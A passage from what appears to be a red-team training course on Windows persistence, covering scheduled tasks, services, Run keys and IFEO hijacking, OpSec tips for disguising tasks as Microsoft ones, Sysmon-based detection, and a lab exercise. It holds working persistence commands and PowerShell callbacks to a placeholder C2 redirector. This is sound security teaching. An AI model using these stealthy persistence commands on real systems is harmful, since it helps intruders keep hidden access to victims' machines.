8.2.3 Scheduled Tasks\r\n\r\n*   **Location:** Configured and managed via the Task Scheduler GUI (`taskschd.msc`) or command-line tools (`schtasks.exe`, PowerShell `*-ScheduledTask` cmdlets). Task definitions are stored in XML files in `C:\\Windows\\System32\\Tasks`.\r\n*   **How it Works:** Allows scheduling programs or scripts to run at specific times, intervals, or in response to specific events (like system startup, user logon, or even on idle). Can be configured to run with different user privileges, including SYSTEM, even if no user is logged in.\r\n*   **Adversary Use:** Extremely versatile and powerful. Can run payloads with high privileges, at specific times to avoid detection, or triggered by events that blend in (e.g., on network connection, workstation unlock). Can hide the task window.\r\n*   **OpSec Consideration:** Less obvious than Run keys unless an administrator actively checks Task Scheduler. Naming and triggers are key OpSec factors. Running as SYSTEM is powerful but might stand out if the payload isn't designed for it.\r\n*   **Practical Example (Creating a Basic Task with `schtasks.exe`):**\r\n    ```cmd\r\n    schtasks /create /tn \"Microsoft\\Windows\\Defrag\\DiskCleanup\" /tr \"C:\\Users\\Public\\cleanup.bat\" /sc ONLOGON /ru %USERNAME% /f\r\n    ```\r\n    *   `/tn \"Microsoft\\Windows\\Defrag\\DiskCleanup\"`: Task Name. Placing it under a legitimate-looking path (`Microsoft\\Windows\\Defrag`) helps blend in.\r\n    *   `/tr \"C:\\Users\\Public\\cleanup.bat\"`: Task Run - the command/script to execute.\r\n    *   `/sc ONLOGON`: Schedule Type - runs when the user logs on. Other options: `ONSTART` (system boot), `DAILY`, `WEEKLY`, `ONIDLE`, `ONEVENT`.\r\n    *   `/ru %USERNAME%`: Run As User - runs as the current logged-in user. Can specify a different user or `SYSTEM`. Requires `/rp` (password) if not current user or SYSTEM.\r\n    *   `/f`: Force creation (overwrites if exists).\r\n*   **Practical Example (Creating a Task with PowerShell):**\r\n    ```bash\r\n    $Action = New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\update_check.ps1'\r\n    $Trigger = New-ScheduledTaskTrigger -AtStartup\r\n    Register-ScheduledTask -TaskName \"WindowsUpdateCheck\" -Action $Action -Trigger $Trigger -Description \"Checks for Windows updates silently.\"\r\n    ```\r\n    *   More verbose but offers greater flexibility and is often preferred in scripting. This example creates a task that runs a PowerShell script at system startup.\r\n\r\n#### 8.2.4 Services\r\n\r\n*   **Location:** Managed via `services.msc`, `sc.exe`, or PowerShell cmdlets (`Get-Service`, `New-Service`, etc.). Service configurations are stored in the Registry under `HKLM\\SYSTEM\\CurrentControlSet\\Services`.\r\n*   **How it Works:** Services are applications that run in the background, often starting at system boot before any user logs in. They can run with various privileges, including SYSTEM.\r\n*   **Adversary Use:** Installing a malicious executable as a service allows it to run automatically with high privileges from boot-up. Can be configured for automatic restart on failure.\r\n*   **OpSec Consideration:** Requires administrator privileges to install a new service. While powerful, creating a new service might trigger alerts. Modifying an existing service is stealthier but riskier. Naming and description are key OpSec factors.\r\n*   **Conceptual Overview (Implementation is more involved):** An adversary would typically drop a malicious executable (often a DLL or EXE designed to run as a service) and then use `sc.exe` or PowerShell `New-Service` to register it as a service.\r\n    ```cmd\r\n    REM Conceptual: This requires a specially crafted executable\r\n    sc create MyBackgroundWorker binPath=\"C:\\Program Files\\Common Files\\worker.exe\" start=auto DisplayName=\"My Background Worker\"\r\n    ```\r\n*   *Note: For this foundational module and CRTO, understanding the *concept* and *detection* of service persistence is more critical than hands-on implementation of creating a complex service executable.*\r\n\r\n#### 8.2.5 Office Macro Persistence\r\n\r\n*   **How it Works:** Malicious VBA code embedded in Office documents can be configured to run automatically when the document is opened (e.g., using `Auto_Open`, `Document_Open` functions).\r\n*   **Adversary Use:** Primarily used for initial access, but can also be used for persistence by modifying template files (like `Normal.dotm` in Word) or adding macros that re-enable themselves or drop other persistence mechanisms.\r\n*   **OpSec Consideration:** Relies on the user opening the document. Detected by AV/EDR scanning documents and VBA code. Requires users to enable macros (though social engineering or bypassing Trust Center settings can overcome this).\r\n\r\n#### 8.2.6 Registry Hijacking (`AppInit_DLLs`, `IFEO`, etc.)\r\n\r\n*   **How it Works:** Certain legitimate registry keys control how Windows loads libraries or executes processes. Adversaries modify these keys to inject their own code into legitimate processes.\r\n    *   `AppInit_DLLs` (`HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows`): Specifies a list of DLLs that `user32.dll` loads into every process that loads `user32.dll` (which is most GUI applications). Requires administrator privileges. Less effective/common in modern Windows versions with Secure Boot and code signing requirements.\r\n    *   `Image File Execution Options (IFEO)` (`HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<ProcessName.exe>`): Originally for developers (e.g., attaching debuggers). Adversaries can set the `Debugger` value to the path of their payload. When `<ProcessName.exe>` is launched, the debugger (the malicious payload) is launched instead. Can be set per-user in `HKCU`.\r\n*   **Adversary Use:** Injecting code into common, legitimate processes makes it harder to detect the malicious code itself. Can achieve high privileges depending on the target process and registry key location.\r\n*   **OpSec Consideration:** Modifying these critical registry keys is highly suspicious and monitored by security software. Requires careful targeting and often code signing or bypass techniques.\r\n*   **Practical Example (IFEO Debugger - Requires Admin for HKLM):**\r\n    ```cmd\r\n    REM This will launch C:\\malware\\payload.exe whenever notepad.exe is launched SYSTEM-WIDE\r\n    reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v Debugger /t REG_SZ /d \"C:\\malware\\payload.exe\" /f\r\n    ```\r\n    *   *Note: Be extremely careful with IFEO on critical system processes!*\r\n\r\n#### 8.2.7 Abusing MSI/Installer Packages (Conceptual)\r\n\r\n*   **How it Works:** Windows Installer (`msiexec.exe`) processes `.msi` files, which can include custom actions.\r\n*   **Adversary Use:** Adversaries can craft malicious MSI packages or modify legitimate ones to execute code during installation or uninstallation. This can be used for initial execution *or* persistence if the package is designed to run on startup or triggers other persistence mechanisms.\r\n*   **OpSec Consideration:** Requires getting the user/system to install the package. Custom actions can be detected.\r\n\r\n### 8.3 OpSec Considerations for Persistence\r\n\r\nChoosing and implementing a persistence mechanism isn't just about *making it work*; it's about *making it stealthy*.\r\n\r\n*   **Blend In:**\r\n    *   **File Names & Paths:** Use names and locations that look legitimate (e.g., `update.exe`, `cleanup.bat` in `C:\\ProgramData`, `C:\\Users\\Public`, `%APPDATA%`, `%TEMP%`, or fake directories under `Program Files` or `Windows`). Avoid obvious names like `malware.exe` or paths like `C:\\temp\\payload`.\r\n    *   **Registry Value/Task Names:** Choose names that mimic legitimate software or system tasks (e.g., \"Microsoft Update Helper\", \"Adobe Synchronization\", \"System Performance Monitor\"). Place Scheduled Tasks under legitimate-looking folders (`Microsoft\\Windows\\...\\`).\r\n    *   **Service Names/Descriptions:** Similar to task names, use plausible names and descriptions.\r\n*   **Use LOLBAS:** Whenever possible, use built-in Windows binaries (`schtasks.exe`, `reg.exe`, `powershell.exe`, `cmd.exe`, `mshta.exe`, `rundll32.exe`) to execute your payload or launcher. This makes the *process execution* look legitimate, shifting the focus to the *command line arguments* and *network connections*.\r\n*   **Understand Execution Context:** Will your persistence mechanism run as the user, Administrator, or SYSTEM? Ensure your payload/launcher is compatible and that the chosen context aligns with your goals (e.g., SYSTEM for high privilege, user for blending in with normal user activity).\r\n*   **Minimize Footprint:** Only set up the persistence you need. Clean up temporary files or unnecessary registry entries.\r\n*   **Test Detection:** *Crucially*, test your chosen persistence method in your lab environment (Module 2) and observe the logs (Module 2) and any security controls (Module 6) to understand how visible it is.\r\n\r\n### 8.4 Detecting Persistence Mechanisms\r\n\r\nThis ties directly back to Module 2 and your lab setup. Defenders look for anomalies in the locations we just discussed. Your SIEM should be configured to ingest logs that reveal these activities.\r\n\r\n*   **Sysmon (Critical!):**\r\n    *   **Event ID 1 (Process Creation):** Look for suspicious processes launching from unusual locations (Startup folders, temp directories) or suspicious parent-child relationships (e.g., `explorer.exe` launching something unusual, `svchost.exe` launching a non-service executable if you used services).\r\n    *   **Event ID 12, 13, 14 (Registry Events):** Monitor modifications to known persistence keys (`Run`, `RunOnce`, Service configuration keys, IFEO keys, `AppInit_DLLs`). Look for suspicious value names and data.\r\n    *   **Event ID 3 (Network Connection):** Your persisted payload will likely try to call back to your C2. Monitor network connections originating from suspicious processes or processes with suspicious command lines.\r\n    *   **Event ID 15 (FileCreateStreamHash):** Can potentially log creation of files in Startup folders, though less direct than process creation.\r\n*   **Windows Security Logs:**\r\n    *   **Event ID 4688 (Process Creation):** Similar to Sysmon Event ID 1, but built-in. Less detail by default, but still useful, especially if command line logging is enabled via GPO.\r\n    *   **Event ID 4698 (A scheduled task was created):** Excellent for detecting `schtasks.exe` or PowerShell creation of tasks. Includes task name, command, and trigger details.\r\n    *   **Event ID 4702 (A scheduled task was updated):** Useful for detecting modifications to existing tasks.\r\n    *   **Event ID 4624 (Successful Logon):** Can be correlated with processes starting on logon (Startup, Run keys).\r\n*   **Task Scheduler Logs:** Dedicated logs for Task Scheduler events provide detail on task creation, registration, execution, and errors.\r\n*   **Registry Auditing:** Configure SACLs (System Access Control Lists) and Windows Auditing to log access/modification attempts on specific, critical registry keys. This generates Security Event IDs like 4657 (A registry value was modified).\r\n\r\nBy simulating persistence and then analyzing the logs in your SIEM, you gain invaluable insight into what defenders see and how to make your simulation more realistic or stealthy.\r\n\r\n---\r\n\r\n### Module Project/Exercise: Implement Initial Persistence\r\n\r\nAlright, time to get hands-on and make our access stick! We'll take the access we established in Module 5 (or simulate having it by running a command directly on the target VM) and set up a persistence mechanism that calls back to our C2 infrastructure from Module 3.\r\n\r\n**Goal:** Implement one basic persistence technique (Scheduled Task or Run Key recommended) on your target Windows client VM that survives a reboot and attempts to re-establish a connection or execute a command pointing towards your C2 redirector. Then, analyze the logs in your SIEM.\r\n\r\n**Prerequisites:**\r\n\r\n*   Your lab environment is running (DC, Client VM - Module 2).\r\n*   Your C2 infrastructure (redirector, simple payload hosting) is operational (Module 3).\r\n*   You have a test payload or command ready that attempts to connect back to your C2 (Module 4/5). This could be a simple PowerShell script using `Invoke-WebRequest` or `curl` to hit your redirector, or a more complex stager/payload. *Keep it simple for this test, focusing on the persistence trigger.*\r\n\r\n**Steps:**\r\n\r\n1.  **Choose Your Persistence Method:** Select *one* of the following for implementation:\r\n    *   **Option A (Recommended): Scheduled Task (`schtasks.exe` or PowerShell)** - Flexible, can run at boot or logon, can hide window.\r\n    *   **Option B: Run Registry Key (`reg.exe`)** - Simple, common, runs on logon.\r\n    *   *(You can experiment with others later, but master one first).*\r\n\r\n2.  **Prepare Your Payload/Command:**\r\n    *   What command will your persistence mechanism run? It needs to do something that signals back to you.\r\n    *   **Simple Example Command:** A PowerShell script that downloads and executes your Module 4 payload from your Module 3 web server. Or even simpler, a command that just attempts to `curl` or `Invoke-WebRequest` a specific URL on your C2 redirector (e.g., `powershell -command \"Invoke-WebRequest -Uri http://your_redirector_ip/checkin -UseBasicParsing\"`). This \"checkin\" request will show up in your redirector logs and potentially Sysmon network logs.\r\n    *   Save this command or script to a location on the target VM (e.g., `C:\\Users\\Public\\checkin.ps1` or `C:\\Windows\\Temp\\runme.cmd`). Make sure the file name and path are somewhat plausible.\r\n\r\n3.  **Implement the Persistence:** Execute the necessary command on the target Windows client VM to set up your chosen persistence method. You can do this by:\r\n    *   Using the access gained in Module 5 (if your C2 framework allows executing commands).\r\n    *   Manually opening a command prompt or PowerShell window on the target VM (simulating having initial access).\r\n\r\n    *   **If Option A (Scheduled Task):**\r\n        *   *Using `schtasks.exe`:*\r\n            ```cmd\r\n            REM Example: Run a PowerShell script at logon\r\n            schtasks /create /tn \"SystemHealthCheck\" /tr \"powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\checkin.ps1\" /sc ONLOGON /ru %USERNAME% /f\r\n            ```\r\n            *Choose a better task name and path for OpSec!*\r\n        *   *Using PowerShell:*\r\n            ```powershell\r\n            # Example: Run a command at system startup\r\n            $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-command \"Invoke-WebRequest -Uri http://your_redirector_ip/startup_check -UseBasicParsing\"'\r\n            $Trigger = New-ScheduledTaskTrigger -AtStartup\r\n            Register-ScheduledTask -TaskName \"ServiceMonitor\" -Action $Action -Trigger $Trigger -Description \"Monitors background services.\"\r\n            ```\r\n            *Replace `your_redirector_ip` with your actual IP/domain.*\r\n\r\n    *   **If Option B (Run Registry Key):**\r\n        *   *Using `reg.exe`:*\r\n            ```cmd\r\n            REM Example: Run a script via cmd.exe on logon\r\n            reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"TemporaryFilesCleanup\" /t REG_SZ /d \"cmd.exe /c C:\\Users\\Public\\checkin.cmd\" /f\r\n            ```\r\n            *Or point directly to a `.exe` or `.vbs` script.*\r\n        *   *Using PowerShell:*\r\n            ```bash\r\n            # Example: Add a Run key pointing to your payload\r\n            $RunKey = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\r\n            $ValueName = \"BackgroundSync\"\r\n            $Command = \"C:\\Users\\Public\\my_payload.exe\" # Or powershell.exe -File ...\r\n            New-ItemProperty -Path $RunKey -Name $ValueName -Value $Command -PropertyType String -Force\r\n            ```\r\n\r\n4.  **Verify Setup (Optional but Recommended):** Before rebooting, check if your persistence mechanism was successfully created.\r\n    *   For Scheduled Task: Open `taskschd.msc` or run `schtasks /query` in command prompt. Look for your task name.\r\n    *   For Run Key: Open `regedit.exe` and navigate to `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`. Look for your value name.\r\n\r\n5.  **Reboot the Target VM:** This is the crucial test! Restart your Windows client VM.\r\n\r\n6.  **Check for Callback/Execution:**\r\n    *   After the VM reboots and you log in (if using ONLOGON) or it boots up (if using ONSTART/AtStartup), check your C2 framework or your redirector's logs (Apache/Nginx access logs) to see if the expected connection or request occurred.\r\n    *   If your payload has a visual indicator (like launching calc.exe), look for that (though stealthy payloads won't).\r\n\r\n7.  **Analyze the Logs in Your SIEM:** Now, switch hats to the defender! Go to your Splunk or ELK instance (Module 2) and search for activity related to the persistence you just implemented.\r\n    *   **Search for the creation:** Look for the command you used (`schtasks.exe`, `reg.exe`, `powershell.exe`) setting up the persistence. Look for Security Event ID 4698 (Task Created) or Sysmon Event ID 12/13/14 (Registry modifications).\r\n    *   **Search for the execution:** After the reboot, look for the process specified in your persistence mechanism (e.g., `powershell.exe`, `cmd.exe`, your payload `.exe`). Look for Sysmon Event ID 1 (Process Creation). Pay attention to the parent process (e.g., `explorer.exe` for Run keys/Startup, `svchost.exe` for Scheduled Tasks running as SYSTEM, `winlogon.exe` for RunOnce).\r\n    *   **Search for the network connection:** Look for Sysmon Event ID 3 (Network Connection) originating from the executed process, connecting to your C2 redirector's IP/port.\r\n    *   **Analyze the command line:** Examine the full command line arguments logged (Sysmon Event ID 1 or Security Event ID 4688 with command line logging) to see what your persistence executed. Could a defender spot this command line?\r\n\r\n**Reflection:**\r\n\r\n*   Did your persistence method work? Did you get a callback after reboot?\r\n*   How visible was the setup of the persistence mechanism in the logs?\r\n*   How visible was the execution of the persisted command/payload in the logs?\r\n*   What log events were most useful in identifying the activity?\r\n*   What could you change (OpSec) to make this persistence method harder to detect based on your log analysis?\r\n\r\n*This project is a direct contribution to your Capstone, demonstrating your ability to establish persistence, integrate it with your C2, and analyze the defensive visibility.*\r\n\r\n---\r\n\r\n### Summary\r\n\r\nFantastic work, team! You've now learned the *why* and *how* of persistence – making sure your hard-won initial access isn't fleeting. We explored common locations like Startup folders, Run keys, and Scheduled Tasks, and touched on others. Crucially, we discussed the OpSec needed to make these techniques stealthier and, through the project, you've had hands-on experience implementing one and analyzing its visibility in your lab's logging infrastructure.\r\n\r\nYou've successfully added another critical layer to your adversary simulation toolkit. You can now get in, execute code, achieve a callback, think about not getting caught immediately, and *make sure you can come back later*.\r\n\r\nThis wraps up the \"Adversary Simulation Foundations\" section. You've built the mindset, the lab, the C2 comms, the payload delivery, the initial execution pipeline, basic evasion concepts, and now, the ability to persist. This is your functional model of the initial access and foothold phase. Give yourselves a pat on the back – that's a significant achievement!\r\n\r\nNext up, we'll start looking at what adversaries do *after* they have a foothold, diving into discovery and lateral movement. But first, make sure you're comfortable with these foundational pieces. Practice them, break them, fix them, and analyze them in your lab logs. This foundation is everything.\r\n\r\nOnward!"
    }
  ]
}
        </script>
    
    </div>
    <script src="../script.js"></script> <!-- Include script based on flag -->
</body>
</html>
